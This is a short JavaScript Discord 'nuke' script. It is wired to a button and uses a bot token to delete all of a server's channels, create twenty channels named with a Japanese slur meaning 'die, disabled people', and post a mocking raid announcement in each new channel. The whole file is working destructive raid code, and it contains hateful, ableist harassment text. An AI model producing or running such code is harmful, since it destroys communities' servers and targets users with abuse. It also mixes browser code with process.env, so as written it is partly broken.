document.getElementById('nukeButton').addEventListener('click', async () => {
    const token = process.env.DISCORD_BOT_TOKEN; // 環境変数からトークンを取得
    const guildId = process.env.GUILD_ID; // 環境変数からギルドIDを取得

    // 全チャンネルを削除
    const response = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
        method: 'GET',
        headers: {
            'Authorization': `Bot ${token}`,
            'Content-Type': 'application/json'
        }
    });

    const channels = await response.json();

    for (const channel of channels) {
        await fetch(`https://discord.com/api/v9/channels/${channel.id}`, {
            method: 'DELETE',
            headers: {
                'Authorization': `Bot ${token}`,
                'Content-Type': 'application/json'
            }
        });
    }

    // 新しいチャンネルを作成
    for (let i = 0; i < 20; i++) {
        await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
            method: 'POST',
            headers: {
                'Authorization': `Bot ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                name: '死ね障害者',
                type: 0 // 0はテキストチャンネル
            })
        });
    }

    // 新しいチャンネルにメッセージを送信
    const newChannelsResponse = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
        method: 'GET',
        headers: {
            'Authorization': `Bot ${token}`,
            'Content-Type': 'application/json'
        }
    });

    const newChannels = await newChannelsResponse.json();

    for (const channel of newChannels) {
        await fetch(`https://discord.com/api/v9/channels/${channel.id}/messages`, {
            method: 'POST',
            headers: {
                'Authorization': `Bot ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: 'この鯖はあきおに荒らされましたwww雑魚シャッコー乙wwwwwwwwwwww。',
                mentions_everyone: true
            })
        });
    }

    alert('サーバーがヌークされました！');
});
